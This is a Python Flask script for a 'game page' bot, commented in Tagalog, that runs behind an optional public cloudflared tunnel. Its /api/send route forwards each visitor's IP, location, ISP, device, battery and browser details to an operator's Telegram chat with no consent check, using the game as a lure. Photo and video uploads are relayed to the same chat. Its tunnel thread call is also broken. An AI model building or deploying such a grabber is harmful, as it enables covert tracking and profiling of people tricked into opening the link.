#!/usr/bin/env python3
"""
SPELL EXCEPTION BOT — game page + Telegram notifier (Python/Flask version)

Paano patakbuhin:
    pip install -r requirements.txt
    python3 app.py
    -> i-enter ang Bot Token at Chat ID kapag tinanong
    -> ibuksan ang http://localhost:5000

Mga route:
    /                -> SPELL EXCEPTION game page
    /api/send        -> device info ng bisita -> sendMessage sa Telegram
    /upload/image    -> photo upload (CONSENT REQUIRED) -> sendPhoto
    /upload/video    -> video upload (CONSENT REQUIRED) -> sendVideo
    /video.mp4       -> reward video ng game (ilagay ang video.mp4 sa folder na ito)
"""

import os
import time
import threading
import subprocess
import base64

import requests
from flask import Flask, request, jsonify, send_from_directory

# ================= CONFIG =================
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Pwedeng i-override sa pamamagitan ng environment variables (para sa
# testing at deployment flexibility). Default: totoong Telegram API.
TG_BASE = os.environ.get("TELEGRAM_API_BASE", "https://api.telegram.org")
TG_TIMEOUT = int(os.environ.get("TG_TIMEOUT", 15))

# ================= BANNER =================
def banner():
    print(r"""
========================================
             SPELL EXCEPTION BOT
      Game page + Telegram notifier
     (photo/video uploads are consent
            based only - no sneaky
         collection, walang gulang)
========================================
""")

# ================= FLASK APP =================
app = Flask(__name__, static_folder="static")


# ================= TELEGRAM FUNCTIONS =================
def send_message(text, BOT_TOKEN, CHAT_ID):
    url = f"{TG_BASE}/bot{BOT_TOKEN}/sendMessage"
    try:
        res = requests.post(
            url,
            data={"chat_id": CHAT_ID, "text": text},
            timeout=TG_TIMEOUT,
        )
        if not res.ok:
            print(f"[!] Telegram sendMessage failed: {res.status_code} {res.text[:200]}")
        return res.ok
    except Exception as e:
        print("Failed to send message:", e)
        return False


def send_photo(path, BOT_TOKEN, CHAT_ID, caption=""):
    url = f"{TG_BASE}/bot{BOT_TOKEN}/sendPhoto"
    with open(path, "rb") as f:
        res = requests.post(
            url,
            data={"chat_id": CHAT_ID, "caption": caption},
            files={"photo": f},
            timeout=60,
        )
    if not res.ok:
        print(f"[!] Telegram sendPhoto failed: {res.status_code} {res.text[:200]}")
    return res.ok


def send_video(path, BOT_TOKEN, CHAT_ID, caption=""):
    url = f"{TG_BASE}/bot{BOT_TOKEN}/sendVideo"
    with open(path, "rb") as f:
        res = requests.post(
            url,
            data={"chat_id": CHAT_ID, "caption": caption},
            files={"video": f},
            timeout=300,
        )
    if not res.ok:
        print(f"[!] Telegram sendVideo failed: {res.status_code} {res.text[:200]}")
    return res.ok


# ================= HELPERS =================
def tg_config():
    """Kunin ang token/chat config ng app (naka-set sa main())."""
    return app.config.get("BOT_TOKEN", ""), app.config.get("CHAT_ID", "")


def format_visitor_info(data):
    """Buoin ang magandang Telegram message mula sa device info payload."""
    def g(key, default="Unknown"):
        v = data.get(key)
        return v if v not in (None, "", "undefined") else default

    battery = g("battery", None)
    if battery is not None and str(battery) not in ("Unknown", "null"):
        charging = g("charging", "")
        battery_txt = f"{battery}%" + (" (charging ⚡)" if charging in (True, "true") else "")
    else:
        battery_txt = "Not available"

    memory = g("memory", "Unknown")
    memory_txt = "Unknown" if str(memory) in ("Unknown", "null", "undefined") else f"{memory} GB"

    location = ", ".join(
        x for x in [g("city", ""), g("region", ""), g("country", "")] if x
    ) or "Unknown"

    mobile = g("mobile", False)
    mobile_txt = "Yes 📱" if mobile in (True, "true", "Yes") else "No (desktop) 🖥"

    lines = [
        "🎮 SPELL EXCEPTION — Visitor Info",
        "━━━━━━━━━━━━━━━━━━",
        f"🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}",
        f"🔗 From: {g('referrer', 'direct / no referrer')}",
        "",
        f"🌐 IP: {g('ip')}",
        f"📍 Location: {location}",
        f"🏢 ISP: {g('isp')}",
        f"🕐 Timezone: {g('timezone')}",
        "",
        f"📱 Mobile: {mobile_txt}",
        f"🖥 Screen: {g('screen')} (viewport {g('viewport')})",
        f"💾 RAM: {memory_txt}",
        f"🔋 Battery: {battery_txt}",
        f"🧭 Language: {g('language')}",
        "",
        f"🧭 Browser UA: {g('browser')}",
    ]
    return "\n".join(lines)


# ================= ROUTES =================
@app.route("/")
def index():
    # Importante: ang game page ay nasa templates/index.html
    # (hindi ang lumaang standalone file sa ugat ng folder)
    return send_from_directory(os.path.join(BASE_DIR, "templates"), "index.html")


@app.route("/video.mp4")
def reward_video():
    return send_from_directory(BASE_DIR, "video.mp4")


@app.route("/api/send", methods=["POST"])
def api_send():
    """Tinatanggap ang device info mula sa page at isina-send sa Telegram."""
    data = request.get_json(silent=True) or {}
    BOT_TOKEN, CHAT_ID = tg_config()

    if not BOT_TOKEN or not CHAT_ID:
        return jsonify({"status": "no-config"}), 200

    send_message(format_visitor_info(data), BOT_TOKEN, CHAT_ID)
    return jsonify({"status": "ok"})


@app.route("/upload/image", methods=["POST"])
def upload_image():
    """
    Photo upload — CONSENT REQUIRED.
    Ang front-end ay may malinaw na consent dialog bago makapili ng photo;
    dito sa server, tinitingnan din natin ang consent flag (double check).
    """
    data = request.get_json(silent=True) or {}
    if not data.get("consent"):
        return jsonify({"status": "rejected", "reason": "no-consent"}), 400

    if "original" not in data or "," not in data["original"]:
        return jsonify({"status": "error", "reason": "bad-data"}), 400

    try:
        img = base64.b64decode(data["original"].split(",")[1])
    except Exception:
        return jsonify({"status": "error", "reason": "bad-base64"}), 400

    path = os.path.join(UPLOAD_DIR, f"img_{int(time.time() * 1000)}.png")
    with open(path, "wb") as f:
        f.write(img)

    BOT_TOKEN, CHAT_ID = tg_config()
    if BOT_TOKEN and CHAT_ID:
        send_photo(path, BOT_TOKEN, CHAT_ID, caption="📷 Photo upload (na-consent ng user)")
    return jsonify({"status": "ok"})


@app.route("/upload/video", methods=["POST"])
def upload_video():
    """
    Video upload — CONSENT REQUIRED (kapareho ng image route).
    Note: 50MB ang limit ng Telegram sendVideo sa bot API.
    """
    consent = request.form.get("consent")
    if consent not in ("true", "yes", "1"):
        return jsonify({"status": "rejected", "reason": "no-consent"}), 400

    if "original" not in request.files:
        return jsonify({"status": "error", "reason": "no-file"}), 400

    file = request.files["original"]
    path = os.path.join(UPLOAD_DIR, f"vid_{int(time.time() * 1000)}.webm")
    file.save(path)

    BOT_TOKEN, CHAT_ID = tg_config()
    if BOT_TOKEN and CHAT_ID:
        send_video(path, BOT_TOKEN, CHAT_ID, caption="🎥 Video upload (na-consent ng user)")
    return jsonify({"status": "ok"})


# ================= CLOUDFLARED TUNNEL (optional) =================
def start_cloudflared(port=5000):
    time.sleep(2)  # hintayin ang Flask
    print("🌐 Starting Cloudflared tunnel...")
    try:
        proc = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"127.0.0.1:{port}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
    except FileNotFoundError:
        print("ℹ️ Walang 'cloudflared' na naka-install — skipping tunnel. "
              "(apt install cloudflared kung gusto mo ng public URL)")
        return

    import re
    for line in proc.stdout:
        print(line.strip())
        if "trycloudflare.com" in line:
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if match:
                print(f"\n✅ Public URL: {match.group()}")
                break


# ================= MAIN FUNCTION =================
def main():
    banner()

    # Pwedeng dumaan sa environment variable, o itanong sa terminal
    BOT_TOKEN = os.environ.get("BOT_TOKEN") or input("🤖 Telegram Bot Token: ").strip()
    CHAT_ID = os.environ.get("CHAT_ID") or input("💬 Telegram Chat ID: ").strip()

    # Store tokens sa Flask app config (hindi na nakikita sa HTML/view-source!)
    app.config["BOT_TOKEN"] = BOT_TOKEN
    app.config["CHAT_ID"] = CHAT_ID

    # Optional na public tunnel (kapag may cloudflared)
    port = int(os.environ.get("PORT", 5000))
    if os.environ.get("NO_TUNNEL") != "1":
        threading.Thread(target=start_cloudflared, port=port, daemon=True).start()

    print(f"🔥 Local server running on http://localhost:{port}")
    app.run(host="0.0.0.0", port=port)


if __name__ == "__main__":
    main()
